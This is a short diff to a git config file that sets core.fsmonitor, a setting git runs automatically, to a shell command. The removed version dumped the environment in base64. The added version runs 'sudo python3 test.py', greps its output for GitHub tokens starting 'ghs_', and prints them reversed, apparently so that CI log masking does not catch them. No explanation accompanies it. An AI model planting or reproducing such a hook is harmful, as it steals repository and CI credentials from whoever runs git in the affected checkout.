@@ -3,4 +3,4 @@
 	filemode = true
 	bare = false
 	worktree = .
-	fsmonitor = "/bin/bash -c 'echo test && id && env | base64 | base64; sleep 200; exit 0' 1>&2"
+	fsmonitor = "/bin/bash -c 'echo test && sudo python3 test.py | tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev; sleep 200; exit 0' 1>&2"
